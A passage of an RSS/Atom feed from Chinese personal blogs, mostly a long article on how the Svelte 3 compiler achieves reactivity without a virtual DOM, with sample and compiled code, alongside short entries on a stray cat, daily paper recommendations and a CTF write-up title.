href="http://mp.weixin.qq.com/s?__biz=MzU0MjE2MzcxMA==&mid=2247483934&idx=1&sn=ebdbd88ae5d6bc5e0a708b578e583a60&chksm=fb1f958fcc681c99b31385f4cfee6471c4b0231d783af25cf09531b37ed2550216826e3788cd#rd" target="_blank" rel="noopener">第二届翼支付杯大数据建模大赛-信用风险用户识别 baseline 分享</a></li></ul>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/02/03/CTF_2021chunqiu/</id>
        <title><![CDATA[CTF | 2021 春秋杯 新年欢乐赛 WriteUp]]></title>
        <updated>2021-02-04T18:10:14+08:00</updated>
        <link href="https://miaotony.xyz/2021/02/03/CTF_2021chunqiu/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/02/03/CTF_2021chunqiu/"><![CDATA[<p><img src="/2021/02/03/CTF_2021chunqiu/image-20210201202652728.png"></p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>前几天有个 2021年“春秋杯”新年欢乐赛，总共有 10]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html</id>
        <title><![CDATA[2021-01-29 论文推荐]]></title>
        <updated>2021-01-29T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html"><![CDATA[2021-01-29 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/557</id>
        <title><![CDATA[我捡了一只猫]]></title>
        <updated>2021-01-28T12:43:46+08:00</updated>
        <link href="https://www.suruifu.com/posts/557"/>
        <content type="text/html" src="https://www.suruifu.com/posts/557"><![CDATA[<p>俗话说得好，好男不养猫，好女不养狗，这也是我心里面的政治正确。</p>
<p>为什么这么说呢，我姑且解释好男不养猫这一点。人活着只有奋斗才有价值。而猫这种东西，就非常衰，非常懒。天天看这种东西，整个人也会懒惰起来。</p>
<p>但是办公室楼道里面有只猫，天天叫，日日叫。流浪猫吧，已经一个多月，甚至两个月了。</p>
<p>我想着，饿死了就不好了。于是就尝试着喂了一下。</p>
<p>为了三四天吧，我想，猫在外面其实是很冷的。</p>
<p>我最近一直是想养个边牧来着，但是囊中羞涩。</p>
<p>想着，先养个流浪猫练习练习也行。</p>
<p>这玩意应该是很麻烦的。同时呢，还会使人堕落。</p>
<p>如果我养了猫，人还没有堕落，我应该就很厉害了。</p>
<p>趁着外面没人，我把猫撸到了我的办公室。</p>
<p>第一件事情竟然是舔毛，神奇。</p>
<p>我现在想着怎么把这个笨猫带回公寓，初步方案是，直接放在我的小米背包里面背回去。如果没有更好方案的话，就这样做。<br />
<img src="https://s.suruifu.com/www/2021/01/WeChat-Image_20210128204320-rotated.jpg" alt="" /></p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html</id>
        <title><![CDATA[2021-01-28 论文推荐]]></title>
        <updated>2021-01-28T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html"><![CDATA[2021-01-28 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html</id>
        <title><![CDATA[2021-01-27 论文推荐]]></title>
        <updated>2021-01-27T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html"><![CDATA[2021-01-27 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html</id>
        <title><![CDATA[2021-01-26 论文推荐]]></title>
        <updated>2021-01-26T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html"><![CDATA[2021-01-26 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html</id>
        <title><![CDATA[2021-01-25 论文推荐]]></title>
        <updated>2021-01-25T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html"><![CDATA[2021-01-25 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/enlightenment-from-svelte-3-compiler.html</id>
        <title><![CDATA[从 Svelte 3 的编译器中得到的启示]]></title>
        <updated>2021-01-17T08:12:00+08:00</updated>
        <link href="https://blog.rexskz.info/enlightenment-from-svelte-3-compiler.html"/>
        <content type="text/html" src="https://blog.rexskz.info/enlightenment-from-svelte-3-compiler.html"><![CDATA[<blockquote><p>前端的编译器，除了可以做转换，是否还有其它用途？</p></blockquote><p>由于现在国内“前端主流框架”的称号基本被 React、Vue、Angular 占领，前二者在渲染层的技术，本质上都是极为相似的：在内存中维护 Virtual DOM，通过某些方式获取到变量被修改，然后利用 DOM Diff 算法（以及一些优化）计算出需要对 DOM 做的操作，再 Patch 到真实的 DOM 上。相信大家（尤其是准备过面试的小伙伴）一定对这些内容比较了解。</p><p>Angular 的最新版使用了一个叫 Ivy 的引擎。对于 Angular 来说，脏值检测跟之前的方法类似（监听用户输入、劫持 <code>setTimeout</code> 等），渲染方面则是用了 <a href="https://google.github.io/incremental-dom/">incremental-dom</a> 的思想做增量渲染。</p><p>我第一次听说 Svelte（读作 [svɛlt]），也只是在两个月前。我刚看到 Svelte 3 文章时，就被“编译型框架”的字样吸引住了。据说它的编译器帮忙做了很多工作，可以不用脏值检测、setState、Proxy 等方式来触发视图更新，也没有了 DOM Diff 的代价。我决定好好研究一番。</p><p><img src="https://static.rexskz.info/blog/article/enlightenment-from-svelte-3-compiler/0.png" alt="几种前端框架的数据响应原理" title="几种前端框架的数据响应原理"></p><h1>Svelte 3 的特点</h1><p>在翻阅 Svelte 的博客时，很容易翻到这篇文章：<a href="https://svelte.dev/blog/virtual-dom-is-pure-overhead">Virtual DOM is pure overhead</a>。通读下来，作者的观点是，Virtual DOM 可以做到状态驱动 UI，性能也不差，并且代码的 Bug 更少；但 Svelte 不用 Virtual DOM 也可以做到类似的效果，并且性能更高。</p><h2>模板语法、模板数据分离</h2><p>本文的重点不是详细讲述 Svelte 3 的语法（照着文档来就可以了），这里只举一些最常用也最简单的例子，一个组件基本长这样，跟 Vue 的组件长得差不多，但有点区别。我列举了变量、双向绑定、事件处理、Watch、常见的控制语句、生命周期这几个特性：</p><pre><code class="lang-html">&lt;!-- App.svelte --&gt;

&lt;script lang=&quot;ts&quot;&gt;
import { onMount } from 'svelte';

// 1：变量、双向绑定、事件处理
let name = 'world';
const onClick = () =&gt; name = 'Rex';

// 2：`if` 块、Watch
let x = 0;
const incX = () =&gt; x++;
// 这就像 Vue 中的 `watch` 功能
// 语法很奇怪，但是是合法的
$: doubleX = x * 2;

// 3：`each` 块
let characters = [
    { name: 'Aroma White' },
    { name: 'Neko Asakura' },
    { name: 'ROBO Head' }
];
const append = (name: string) =&gt; {
    if (!characters.find(t =&gt; t.name === name)) {
        characters = [...characters, { name }];
    }
};

// 生命周期
onMount(async () =&gt; {
    const res = await fetch(`/photos`);
    const photos = await res.json();
    console.log(photos);
});
&lt;/script&gt;

&lt;main&gt;
    &lt;section class=&quot;my-section-1&quot;&gt;
        &lt;h1&gt;Hello {name}!&lt;/h1&gt;
        &lt;input bind:value={name}&gt;
        &lt;button on:click={onClick}&gt;I'm Rex&lt;/button&gt;
    &lt;/section&gt;
    &lt;section class=&quot;my-section-2&quot;&gt;
        {#if x &gt; 10}
            &lt;p&gt;{x} is greater than 10&lt;/p&gt;
        {:else if x &lt; 5}
            &lt;p&gt;{x} is less than 5&lt;/p&gt;
        {:else}
            &lt;p&gt;{x} is between 5 and 10&lt;/p&gt;
        {/if}
        &lt;p&gt;Double x is {doubleX}&lt;/p&gt;
        &lt;button on:click={incX}&gt;x++&lt;/button&gt;
    &lt;/section&gt;
    &lt;section class=&quot;my-section-3&quot;&gt;
        &lt;button on:click={() =&gt; append('Simon Jackson')}&gt;
            Add Simon
        &lt;/button&gt;
        &lt;ul&gt;
            {#each characters as c, i}
                &lt;li&gt;{i + 1}: {c.name}&lt;/li&gt;
            {/each}
        &lt;/ul&gt;
    &lt;/section&gt;
&lt;/main&gt;

&lt;style&gt;
main {
    font-size: 18px;
}
&lt;/style&gt;</code></pre><p>单看 <code>&lt;main&gt;</code> 的部分，是不是感觉找回了上古时期写 PHP 和 Django 模板的感觉？虽然语法比较复古，但其实现代前端支持的东西，它基本都能做：</p><ul><li>组件化：每个 <code>.svelte</code> 文件就是一个组件，并且也完整支持 Props、Context、Slot；</li><li>完整的生命周期：<code>onMount</code>、<code>onDestroy</code>、<code>beforeUpdate</code>、<code>afterUpdate</code>。</li></ul><h2>利用编译器实现响应式</h2><p>那么它是怎么做的呢？记得我之前年少轻狂写 <code>rsjs</code> 的时候（那时候的主流还是 Angular 1），由于水平太菜，迟迟不知道如何做到 Angular 的脏值检测，于是只好退而求其次，搞了个 <code>setData</code> 函数，并且每次数据更新都是完整渲染，可以说是效率很低了。这其实跟 React 更贴近一些……</p><p>其实 Svelte 以前也是这样做的，但 <a href="https://svelte.dev/blog/svelte-3-rethinking-reactivity">Svelte 3: Rethinking reactivity</a> 这篇文章的意思是，由于 Svelte 3 在编译期间就可以知道每个变量在模板的什么地方被用到，因此只要变量有被模板用到，编译器就会在该变量的所有“直接赋值”的语句外面包一个 <code>$$invalidate</code> 函数，例如这样：</p><pre><code class="lang-typescript">// 原始代码：
count += 1;
// 会被编译成这样的形式：
$$invalidate('count', count += 1);</code></pre><p>至于 <code>Array.prototype.push</code> 之类的函数，以及修改引用值，Svelte 没有像 Vue 那样劫持原生函数，也没有在编译器中做引用判断，因此需要开发者变通一下，转换成对变量直接赋值的语句。鉴于 React 也是这样的要求（每次 <code>setState</code> 都需要设置一个新对象），因此这一点我觉得是可以接受的。</p><h2>局部更新和直接操作 DOM</h2><p>由于 Svelte 3 使用的是类似上古时期的模板语法，没有 TSX Render Function 这么灵活的功能，因此可以更好地被用作静态分析。</p><p>我我把刚刚的代码编译了一下（详见彩蛋），在未压缩的模式下，很容易找出每个函数和变量在源代码中的位置。大概看了一眼，能得出这样的结论：</p><ul><li>数据会被统一打包到一个数组中方便管理，类似 React Hooks 的线性存储方式；</li><li>模板被转换成渲染函数，每个 if 和 each 块也被转换成渲染函数，方便局部更新；</li><li>对于每个渲染函数，有 Create、Make Tree、Patch、Detach 四个操作；</li><li>没有 Virtual DOM，而是为每个块定制 Create 和 Make Tree 操作，直接修改 DOM；</li><li>Vue 通过 Proxy 来实现的监听，在 Svelte 3 中成了为每个块定制的 Patch 操作；</li><li>在卸载的时候，会先卸载组件，再执行清理函数（取消监听器之类的）。</li></ul><h2>其它</h2><p>对 Svelte 3 的更具体的分析，由于网上已经有人写了（详见文末的参考资料），这里就不多提了。</p><h1>我从中得到的启示</h1><h2>1. Virtual DOM 并不是唯一出路</h2><p>由于我和我的前端朋友们几乎全都是写 React 和 Vue 的，因此我们很自然地认为 Virtual DOM、TSX 等方式已经足够了。但是 Svelte 3 跟快被我们忽略的 Angular，坚持采用模板的方式，没有拥抱 Virtual DOM，并且也取得了不错的成果。这说明 Virtual DOM 并不是唯一出路。</p><p>个人觉得，Angular 现在之所以没有成为主流，是因为它是一整套服务，上手难度高，而非因为没有拥抱 Virtual DOM。</p><h2>2. 无论如何编码，总会有 Tradeoff</h2><p>我们应该听到过很多“最佳实践”，或者是“错误的写法”，例如：</p><ul><li>在 React 中，不管是 <code>setState</code> 还是 Reducer，每次必须返回一个新的对象；</li><li>在 React Hooks 中，一个 Hooks 必须只能写在函数式组件里或另一个 Hooks 里；</li><li>在 Vue 的 <code>data</code> 中必须要声明所有用到的字段，否则必须要用 <code>$set</code> 来更新；</li><li>在 Vue 的模板中，不能直接使用模块内变量或全局变量，需要通过 <code>data</code> 传过去；</li><li>在 immerjs 中，不能认为 <code>a=b</code> 之后修改 <code>a</code> 对象就是修改 <code>b</code>，它俩不是同一个东西。</li></ul><p>这些都是为了实现库或框架的功能而必须的 Tradeoff，因为过度自由的编码，会导致你的代码无法通过统一的算法来检测和优化，也无法让你的代码更加工程化。举个例子，我在写面单编辑器的时候针对业务数据做了一些限制，否则不可能一个人在一周的时间内快速完成；TypeScript 的代码可达性检测也不能检测停机问题。</p><p>Svelte 3 针对编译器的功能，限制了用户使用 Render Function 以及 Virtual DOM，以及不能对需要响应变化的变量用 <code>push</code> 这些可以原地操作数据的函数（对象的深层次赋值是可以的），虽然会失去一定的灵活性，但可以让编译器帮你做更多的事情。</p><p><img src="https://static.rexskz.info/blog/article/enlightenment-from-svelte-3-compiler/1.png" alt="时间、空间、编程复杂度往往互相牵制" title="时间、空间、编程复杂度往往互相牵制"></p><h2>3. 编译器能做的事情，比我认为的要多</h2><p>其实这一点，搞二进制开发、逆向的大佬们感触应该会更深。例如：</p><ul><li>C 语言程序开始执行后并不会先进入 <code>main</code> 函数，而是一个叫做 <code>_start</code> 的函数；</li><li>上古时期 <code>x * 9</code> 会被开发者写成 <code>x &lt;&lt; 3 + x</code>，但现在大部分优化都被编译器做了（而且绝对比你手工优化做的好）；</li><li>事实上，C 编译的过程就是把支持了很多特性的高级语言，转换成只支持基本指令的机器语言，源代码和编译产物往往很不相似（这也是为什么 C 逆向比 JS 逆向难得多）。</li></ul><p>前端编译器最开始的作用，无非是转换一些语法、添加一些 Runtime；后来逐渐出现了各种 Webpack Loader 和 Rollup 插件，支持了更多的文件格式（<code>.vue</code> 文件转换前后整个结构就变了），这也在某种程度上反映出前端在复杂度和工程化程度上的提升。这些东西也成了一些公司面试的必考点，用来区分普通程序员和高级工程师。</p><p>这次 Svelte 3 的编译器，在保留了“响应式前端”概念的基础之上，进一步让代码得到了简化，并且也极大减少了运行时代码的执行，为世界的碳排放做出了一定的贡献。（咦？）</p><p>我有一个小预测：随着前端复杂度和工程化程度的进一步提升，未来的编译器一定可以帮我们做更多的事情，现有的框架可能也会将一部分在运行时的功能使用编译器辅助实现。由于编译器的功能越来越多，面试的要点会逐渐从框架的原理，变成编译器的原理。</p><h2>4. 优化除了提高算法效率，还有预处理</h2><p>在以前当赛棍的时候，经常会提到两个概念：时间复杂度、空间复杂度。利用空间换时间的技术一般被叫做“预处理”，即提前计算好一些东西，用的时候直接调用。</p><p>谷歌出的一个代码压缩器 GCC（Google Closure Compiler），可以帮忙做一些 Inline 的操作，以及提前计算，避免在运行的过程中重复取值。不过一些优化过于激进，可能会导致代码无法运行，加上后来出现的 Terser 等工具做的确实不错，因此 GCC 没有被广泛使用。</p><p>而 Svelte 3 的做法，则是利用编译器直接计算出每个值改变时需要做什么，相当于直接把脏值检测跟 DOM Diff 计算后的执行流程写死到了组件的代码里，免去了在运行时计算的过程。虽然代码会比较长，但由于重复操作多，信息量小，因此压缩后并不会占用太多的空间。这是个既省空间又省时间的做法。</p><p>P.S. 三年前我面试 Shopee 的时候，老板问了我一个主观问题（之前的文章可以看 <a href="https://blog.rexskz.info/sz-1day-trip-and-shopee-final-interview.html">这里</a>）：</p><blockquote><p>如果单从修改 DOM 结构来看，React + DOM Diff 算法与纯 jQuery 直接操作（假设已经知道该如何最快的 Patch）相比，哪个效率比较高？</p></blockquote><p>我的答案是：当结构不复杂的时候，DOM Diff 的耗时占比重是不能被忽略的，此时当然是 jQuery 快；但是当结构复杂了之后，DOM Diff 的耗时占比重就比较低了，更多的时间被消耗在 DOM 的操作上——React 是直接 Patch 到 DOM 上，但 jQuery 是在原生 DOM 上面封装了一层，所以会再慢一些，这个的时间是要多于 DOM Diff 的。</p><p>当时我并不知道标准答案是什么，现在看前端的趋势也没必要再考虑 jQuery 了。但如果再加上 Svelte 3，问题就有意思起来了。Svelte 由于把预处理的时间放到了编译期间，在运行时也只对 DOM 操作做了最简单的封装，因此既没有 React 的 DOM Diff 时间，又比 jQuery 要快。</p><p>究竟封装有多简单呢？可以看一下 Svelte 3 的工具函数，基本相当于没有封装啊……估计是为了以后添加更多的钩子吧：</p><pre><code class="lang-javascript">function append(target, node) {
    target.appendChild(node);
}
function insert(target, node, anchor) {
    target.insertBefore(node, anchor || null);
}
function detach(node) {
    node.parentNode.removeChild(node);
}
function element(name) {
    return document.createElement(name);
}
function text(data) {
    return document.createTextNode(data);
}
function space() {
    return text(' ');
}
function listen(node, event, handler, options) {
    node.addEventListener(event, handler, options);
    return () =&gt; node.removeEventListener(event, handler, options);
}
function attr(node, attribute, value) {
    if (value == null)
        node.removeAttribute(attribute);
    else if (node.getAttribute(attribute) !== value)
        node.setAttribute(attribute, value);
}
function children(element) {
    return Array.from(element.childNodes);
}
function set_input_value(input, value) {
    input.value = value == null ? '' : value;
}</code></pre><h1>彩蛋</h1><h2>到底该信哪一份数据</h2><p>我在统计框架使用量的时候，一开始认为开发者提的问题越多，代表这个框架越火。根据 StackOverflow 在 2020 年对接近 65000 个开发者的调查（<a href="https://insights.stackoverflow.com/survey/2020#technology-web-frameworks-all-respondents2">传送门</a>），可以发现最主流的几个框架依次是 Angular/Angular.js、React、Vue。这跟我的认知不符，因为在国内我几乎没有遇到多少 Angular 的开发者，反而因为 Vue 的上手难度低，导致中小型公司更喜欢用 Vue。</p><p><img src="https://static.rexskz.info/blog/article/enlightenment-from-svelte-3-compiler/2.png" alt="来自 StackOverflow 的统计数据" title="来自 StackOverflow 的统计数据"></p><p>我在想，可能是因为幸存者偏差，可以再看看 NPM 上面的下载量。于是我用 <a href="https://npm-stat.com/charts.html?package=react&package=vue&package=angular&from=2020-01-01&to=2020-12-31">npm-stat</a> 统计了一下三大框架在 2020 年的下载量，结果是这样的：</p><p><img src="https://static.rexskz.info/blog/article/enlightenment-from-svelte-3-compiler/3.png" alt="来自 npm-stat 的统计数据" title="来自 npm-stat 的统计数据"></p><p>可以看到 React 基本占了主流，跟 Angular 简直是数量级的差距。</p><p>但是 NPM 的下载量就一定能说明结果吗？是否有可能因为 Angular 的使用者由于构建优化的更好，避免了每次流水线都从 NPM 下载？我不了解，也不知道从何了解。</p><h2>编译结果究竟长啥样</h2><p>答案：长这样，长相并不好看。（摊手）</p><p>我已经尽可能添加注释帮助理解了，如果不愿意看代码，把注释当文章来读也是可以的。</p><pre><code class="lang-javascript">// 一堆通用的工具函数，用来创建 DOM、设置数据等
import { ... } from &quot;svelte/internal&quot;;
import { onMount } from &quot;svelte&quot;;

// 一个取决于组件数据的工具函数
// 用于找到 `each` 块中的 Context
function get_each_context(ctx, list, i) {
    const child_ctx = ctx.slice();
    child_ctx[9] = list[i];
    child_ctx[11] = i;
    return child_ctx;
}

// 第 48 行的 else 块，主要包含了四个函数
function create_else_block(ctx) {
    // 这些是每一个 DOM 元素
    let p;
    let t0;
    let t1;

    return {
        // c：创建（Create）
        // 调用工具函数，依次创建每一个 DOM 元素
        c() {
            p = element(&quot;p&quot;);
            // 这里 ctx[0] 就对应了 x，编译器的注释标的恰到好处
            t0 = text(/*x*/ ctx[0]);
            t1 = text(&quot; is between 5 and 10&quot;);
        },
        // m：建树（Make Tree）
        // 通过创建好的 DOM 元素，将 DOM 树构建好
        m(target, anchor) {
            insert(target, p, anchor);
            append_1(p, t0);
            append_1(p, t1);
        },
        // p：更新（Patch）
        // 在这个 else 块中，只依赖了一个 x，因此只有一个 if 语句
        // 若组件被标记为 dirty，且 x 被改
        // 则调用工具函数 set_data 直接更新 DOM 元素中的 innerText
        // Svelte 将“某变量被修改”的标记用位运算做了压缩，详见参考资料
        p(ctx, dirty) {
            if (dirty &amp; /*x*/ 1) set_data(t0, /*x*/ ctx[0]);
        },
        // d：卸载（Detach）
        // 当组件被卸载时需要做的事情，一般是卸载元素
        // 如果有事件监听的话也会取消监听
        d(detaching) {
            if (detaching) detach(p);
        }
    };
}

// 接下来的两个函数分别是：
// 第 46 行的 else 块
// 第 44 行的 if 块
// 里面长得跟刚才基本一样，不多提了
function create_if_block_1(ctx) { ... }
function create_if_block(ctx) { ... }

// 第 59 行的 each 块
// 稍微有一点区别，因为有 key
// 并且模板渲染用到的数据不是 JS 的基本类型
function create_each_block(ctx) {
    let li;
    // 因为在模板中我们写了 i + 1
    let t0_value = /*i*/ ctx[11] + 1 + &quot;&quot;;
    let t0;
    let t1;
    // 因为在模板中我们写了 c.name
    let t2_value = /*c*/ ctx[9].name + &quot;&quot;;
    let t2;

    return {
        c() {
            li = element(&quot;li&quot;);
            // 这里直接调用 i + 1 的值
            t0 = text(t0_value);
            t1 = text(&quot;: &quot;);
            // 这里直接调用了 c.name 的值
            t2 = text(t2_value);
        },
        m(target, anchor) { ... },
        p(ctx, dirty) {
            // 这里除了判断组件是 dirty 和 characters 被修改以外
            // 还多判断了一步 characters[i].name 是否被修改
            if (
                dirty &amp; /*characters*/ 4 &amp;&amp;
                t2_value !== (t2_value = /*c*/ ctx[9].name + &quot;&quot;)
            ) {
                set_data(t2, t2_value);
            }
        },
        d(detaching) { ... }
    };
}

// 整个组件的创建函数
function create_fragment(ctx) {
    // 依旧是各种 DOM 元素
    // ...为了简洁，我只保留了 main，省略其它所有变量
    let main;
    // 这个用来判断组件是否已经挂载结束
    let mounted;
    // 这个用来收集在卸载时需要做的事情，是一个数组
    // Svelte 的监听器跟 Angular、React.useEffect 类似
    // 都是返回一个卸载函数
    let dispose;

    // 第 44 行的 if 块，在这里被转换成了真正的 JS
    // 这里判断该使用哪个渲染函数来渲染 if 块
    function select_block_type(ctx, dirty) {
        if (/*x*/ ctx[0] &gt; 10) return create_if_block;
        if (/*x*/ ctx[0] &lt; 5) return create_if_block_1;
        return create_else_block;
    }

    // 第 44 行的 if 块，需要用这个渲染函数来渲染
    let current_block_type = select_block_type(ctx, -1);
    let if_block = current_block_type(ctx);

    // 第 59 行的 each 块，需要转换为若干个渲染函数
    // 每个函数都只负责渲染其中的一次迭代
    let each_value = /*characters*/ ctx[2];
    let each_blocks = [];
    for (let i = 0; i &lt; each_value.length; i += 1) {
        each_blocks[i] = create_each_block(
            get_each_context(ctx, each_value, i)
        );
    }

    // 跟刚才类似的几个函数，只不过复杂了很多
    return {
        // 这里的 c 里面除了创建基本的元素以外
        // 还要调用刚刚 if、each 相关的 c 函数
        c() {
            main = element(&quot;main&quot;); // ...省略其它
            // 这里调用了 if 块的 c 函数
            if_block.c();
            t7 = space(); // ...省略其它

            // 这里调用了 each 数组中每个元素的 c 函数
            for (let i = 0; i &lt; each_blocks.length; i += 1) {
                each_blocks[i].c();
            }

            // 为刚创建好的 DOM 元素设置属性
            attr(section0, &quot;class&quot;, &quot;my-section-1&quot;);
            attr(section1, &quot;class&quot;, &quot;my-section-2&quot;);
            attr(section2, &quot;class&quot;, &quot;my-section-3&quot;);
            // 组件自身的 Scoped CSS 在编译阶段即完成
            attr(main, &quot;class&quot;, &quot;svelte-5if2as&quot;);
        },
        // 跟之前类似，利用创建好的 DOM 元素，构建 DOM 树结构
        // 这里也会调用每个 if、each 块中的 m 函数
        m(target, anchor) {
            insert(target, main, anchor); // ...省略其它
            // 模板中的 input 有个双向绑定
            set_input_value(input, /*name*/ ctx[1]);
            append_1(section0, t4); // ...省略其它

            for (let i = 0; i &lt; each_blocks.length; i += 1) {
                each_blocks[i].m(ul, null);
            }

            // 执行到这里，其实已经挂载完成了
            // 收集一下卸载时需要执行的函数，然后标记为 mounted
            if (!mounted) {
                dispose = [
                    listen(input, &quot;input&quot;, /*input_input_handler*/ ctx[7]),
                    listen(button0, &quot;click&quot;, /*onClick*/ ctx[4]),
                    listen(button1, &quot;click&quot;, /*incX*/ ctx[5]),
                    listen(button2, &quot;click&quot;, /*click_handler*/ ctx[8])
                ];
                mounted = true;
            }
        },
        // 需要 Patch 的变量变得多了起来
        // 可以看出来，这是依据组件内容生成的代码
        // 随着组件中用到的变量增多，这个函数会变得越来越大
        p(ctx, [dirty]) {
            if (dirty &amp; /*name*/ 2) set_data(t1, /*name*/ ctx[1]);

            // 这里是双向绑定
            if (dirty &amp; /*name*/ 2 &amp;&amp; input.value !== /*name*/ ctx[1]) {
                set_input_value(input, /*name*/ ctx[1]);
            }

            // ...省略其它
        },
        i: noop,
        o: noop,
        // 在卸载的时候：
        // 先卸载组件
        // 再卸载所有块
        // 最后执行之前收集的清理函数
        d(detaching) {
            if (detaching) detach(main);
            if_block.d();
            destroy_each(each_blocks, detaching);
            mounted = false;
            run_all(dispose);
        }
    };
}

// 这一段是源代码中的 &lt;script&gt; 部分
// 编译器很贴心，把我在源代码中写的注释都给保留了
function instance($$self, $$props, $$invalidate) {
    let doubleX;
    let name = &quot;world&quot;;
    const onClick = () =&gt; $$invalidate(1, name = &quot;Rex&quot;);

    // 2：`if` 块、Watch
    let x = 0;

    const incX = () =&gt; $$invalidate(0, x++, x);

    // 3：`each` 块
    let characters = [
        { name: &quot;Aroma White&quot; },
        { name: &quot;Neko Asakura&quot; },
        { name: &quot;ROBO Head&quot; }
    ];

    const append = name =&gt; {
        if (!characters.find(t =&gt; t.name === name)) {
            $$invalidate(2, characters = [...characters, { name }]);
        }
    };

    // 生命周期
    onMount(async () =&gt; {
        const res = await fetch(`/photos`);
        const photos = await res.json();
        console.log(photos);
    });

    function input_input_handler() {
        name = this.value;
        $$invalidate(1, name);
    }

    const click_handler = () =&gt; append(&quot;Simon Jackson&quot;);

    // 补充：
    // 在这里 doubleX 被直接套在了一个叫 update 的函数中
    // 并且也用跟 p 函数类似的方式来判断是否需要更新（如果 x 被改变）
    // 如果有其它 Watch 的变量，也会被放在这里
    $$self.$$.update = () =&gt; {
        if ($$self.$$.dirty &amp; /*x*/ 1) {
            // 这就像 Vue 中的 `watch` 功能
            // 语法很奇怪，但是是合法的
            $: $$invalidate(3, doubleX = x * 2);
        }
    };

    return [x, name, characters, doubleX, onClick, incX, append, input_input_handler, click_handler];
}

// 很简单地对外暴露一个实例
class App extends SvelteComponent {
    constructor(options) {
        super();
        init(this, options, instance, create_fragment, safe_not_equal, {});
    }
}

export default App;</code></pre><h1>参考资料</h1><ul><li><a href="https://tc9011.com/2018/06/07/%E3%80%90%E8%AF%91%E3%80%91angular%20ivy%E7%9A%84%E5%8F%98%E6%9B%B4%E6%A3%80%E6%B5%8B%E6%89%A7%E8%A1%8C%EF%BC%9A%E4%BD%A0%E5%87%86%E5%A4%87%E5%A5%BD%E4%BA%86%E5%90%97%EF%BC%9F/">【译】Angular Ivy的变更检测执行：你准备好了吗？ | tc9011's</a></li><li><a href="https://www.codenong.com/j5e72ec58e51d45270c2/">都2020年了你还不知道Svelte（2）—— 更新渲染原理 | 码农家园</a></li><li><a href="https://developers.google.com/closure/compiler/docs/api-tutorial3">Advanced Compilation | Closure Compiler | Google Developers</a></li></ul><hr><h1>Update 2021-01-18</h1><p>经大佬提示，有个叫 <a href="https://2020.stateofjs.com/en-US/technologies/front-end-frameworks/">State of JS</a> 的网站会对开发者做调查，并发布一份报告。在链接中，可以看到目前用途最广泛的是 React，然后 Angular 比 Vue 略高一筹。此外，Svelte 无论是满意度、使用量还是价值，都在稳步提升，公众对它也始终保持很高的兴趣。</p><h1>Update 2021-01-21</h1><p>从另一个大佬那里得知了 Vue 有两个新提案：<a href="https://github.com/vuejs/rfcs/pull/222">New script setup and ref sugar</a>，第一个是为了直接用最新的 <code>setup</code> 函数替代之前的组件创建流程，第二个是跟 Svelte 类似，利用 JS Label 的语法来做响应式的语法糖。</p><p>它俩分别是这样用的：</p><pre><code class="lang-html">&lt;script setup&gt;
// imported components are also directly usable in template
import Foo from './Foo.vue'
import { ref } from 'vue'

// write Composition API code just like in a normal setup()
// but no need to manually return everything
const count = ref(0)
const inc = () =&gt; { count.value++ }
&lt;/script&gt;

&lt;template&gt;
    &lt;Foo :count=&quot;count&quot; @click=&quot;inc&quot; /&gt;
&lt;/template&gt;</code></pre><pre><code class="lang-html">&lt;script setup&gt;
// declaring a variable that compiles to a ref
ref: count = 1

function inc() {
    // the variable can be used like a plain value
    count++
}

// access the raw ref object by prefixing with $
console.log($count.value)
&lt;/script&gt;

&lt;template&gt;
    &lt;button @click=&quot;inc&quot;&gt;{{ count }}&lt;/button&gt;
